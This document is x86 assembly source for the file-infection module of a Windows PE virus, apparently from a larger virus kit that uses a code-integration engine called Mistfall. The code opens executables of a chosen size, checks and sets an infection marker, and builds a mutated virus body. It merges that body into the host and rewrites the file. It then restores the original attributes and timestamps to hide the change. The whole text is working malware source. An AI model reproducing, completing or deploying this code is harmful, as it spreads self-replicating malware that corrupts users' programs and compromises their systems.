
MAXMEM                  equ     02000000h       ; 32 MB
MIN_FILE_SIZE           equ     32768
MAX_FILE_SIZE           equ     524288
ADD_SIZE                equ     262144

include                 INFECTB.INC
include                 ..\FILEIO\FILEIO.INC
include                 ..\MEMORY\MEMORY.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\..\INCLUDE\PGN2\pgn2.inc
include                 ..\..\INCLUDE\mz.inc
include                 ..\..\INCLUDE\pe.inc
include                 ..\PLAN\PLAN.INC
include                 ..\RANDOM\RANDOM.INC
include                 ..\LDRWIN32\LDRWIN32.INC
include                 ..\MAKEBODY\MAKEBODY.INC
include                 ..\EXTMAN\EXTMAN.INC

include                 ..\MISTFALL\mistfall.inc
include                 ..\LDE\lde.inc
include                 ..\CODEGEN\codegen.inc
include                 ..\ETG\etg.inc

                        extern  sigman:PROC
                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

v_bufptr                dd      0
v_memptr                dd      0
v_bufsize               dd      ?
v_maxbufsize            dd      ?
v_memcount              dd      ?

save_ebp                dd      ?
mbi                     makebody_info ?
old_attr                dd      ?

                        .code

HandleEvent:            mov     eax, [esp+4]    ; event_id
                        mov     edx, [esp+8]    ; user_param = fname

                        cmp     eax, EV_INFECTB_INFECTFILE
                        je      __infect_edx

__return_0:             xor     eax, eax
                        retn

__infect_edx:           call    infect
                        retn

; input:  EDX=filename
; output: EAX=0 -- NOT infected
;         EAX=1 -- INFECTED, alredy or right now
;

infect:                 pusha
                        cld

                        mov     [esp].pusha_eax, 0      ; exit code
                        mov     v_bufptr, 0
                        mov     v_memptr, 0

                        push    [esp].pusha_edx ; fname
                        callW   fgetattr
                        mov     old_attr, eax
                        cmp     eax, -1
                        je      __quit

                        push    32
                        push    [esp+4].pusha_edx
                        callW   fsetattr
                        or      eax, eax
                        jz      __exit

                        push    [esp].pusha_edx
                        callW   fopen_ro        ; open in read-only mode
                        or      eax, eax
                        jz      __exit
                        xchg    ebx, eax

                        push    ebx
                        callW   fgetsize
                        mov     v_bufsize, eax

                        cmp     eax, MIN_FILE_SIZE
                        jb      __close
                        cmp     eax, MAX_FILE_SIZE
                        ja      __close

                        add     eax, ADD_SIZE
                        mov     v_maxbufsize, eax

                        push    eax
                        callW   malloc
                        mov     v_bufptr, eax

                        push    0               ; pos
                        push    v_bufsize
                        push    v_bufptr
                        push    ebx
                        callW   fread
                        cmp     eax, v_bufsize
                        jne     __close

                        push    ebx
                        callW   fgettimev

                        push    ebx
                        callW   fclose

                        mov     esi, v_bufptr
                        cmp     [esi].mz_id, 'ZM'
                        jne     __exit

                        cmp     [esi].mz_csum.byte ptr 1, 1
                        mov     [esp].pusha_eax, 1
                        je      __exit
                        mov     [esp].pusha_eax, 0
                        mov     [esi].mz_csum.byte ptr 1, 1

                        mov     edi, [esi].mz_neptr
                        cmp     edi, v_bufsize
                        jae     __exit
                        cmp     [esi+edi].pe_id, 'EP'
                        jne     __exit

                        ; we need std file with DATA section to infect
                        cmp     [esi+edi+0F8h+28h*1].oe_flags, 0C0000040h
                        je      __good
                        cmp     [esi+edi+0F8h+28h*2].oe_flags, 0C0000040h
                        jne     __exit
__good:

                        ; build virus body
                        lea     edi, mbi
                        mov     ecx, size mbi
                        xor     eax, eax
                        rep     stosb
                        mov     mbi.mbi_flags, FL_MBI_SAVEREGS

                        push    offset mbi
                        callW   build_body
                        add     esp, 4

                        or      eax, eax
                        jz      __exit

                        add     mbi.mbi_vir_size, 3     ; DWORD-align
                        and     mbi.mbi_vir_size, not 3 ;

                        push    offset sigman           ; sigman(), 0=unused
                        push    offset my_mutate        ; mutate()
                        push    offset my_malloc
                        push    v_maxbufsize
                        push    offset v_bufsize        ; &bufsize [OUT]
                        push    v_bufsize               ; bufsize  [IN]
                        push    v_bufptr                ; buf      [IN/OUT]
                        callW   mistfall_engine
                        add     esp, 7*4

                        cmp     eax, ERR_SUCCESS        ; 0=ERR_SUCCESS
                        je      __cont
                        int 3
                        jmp     __exit
__cont:

                        push    [esp].pusha_edx
                        callW   fdelete

                        push    [esp].pusha_edx
                        callW   fcreate
                        or      eax, eax
                        jz      __exit
                        xchg    ebx, eax

                        push    0                       ; pos
                        push    v_bufsize
                        push    v_bufptr
                        push    ebx
                        callW   fwrite

                        push    ebx
                        callW   fsettimev

                        mov     [esp].pusha_eax, 1      ; exit code
__close:
                        push    ebx
                        callW   fclose
__exit:
                        push    old_attr
                        push    [esp+4].pusha_edx
                        callW   fsetattr

                        call    dealloc

__quit:                 popa
                        retn

dealloc:                callW   build_free

                        push    v_bufptr
                        callW   mfree
                        mov     v_bufptr, 0

                        push    v_memptr
                        callW   mfree
                        mov     v_memptr, 0

                        retn

                        public  unload
unload:
                        call    dealloc

                        xor     eax, eax
                        retn

; ---------------------------------------------------------------------------

; cdecl BYTE* malloc(DWORD size)

my_malloc:
                        cmp     v_memptr, 0
                        jne     __alredy

                        push    MAXMEM
                        callW   malloc
                        or      eax, eax
                        jz      __error
                        mov     v_memptr, eax
__alredy:

                        mov     eax, [esp+4]    ; size
                        add     eax, 7
                        and     al, not 7
                        mov     ecx, eax

                        add     eax, v_memcount
                        cmp     eax, MAXMEM
                        jae     __error
                        xchg    v_memcount, eax
                        add     eax, v_memptr
                        ;;
                        pusha
                        xchg    edi, eax
                        shr     ecx, 2
                        xor     eax, eax
                        cld
                        rep     stosd
                        popa
                        ;;
                        retn

__error:                xor     eax, eax
                        retn

; ---------------------------------------------------------------------------

include                 mutate.inc

; ---------------------------------------------------------------------------

                        end
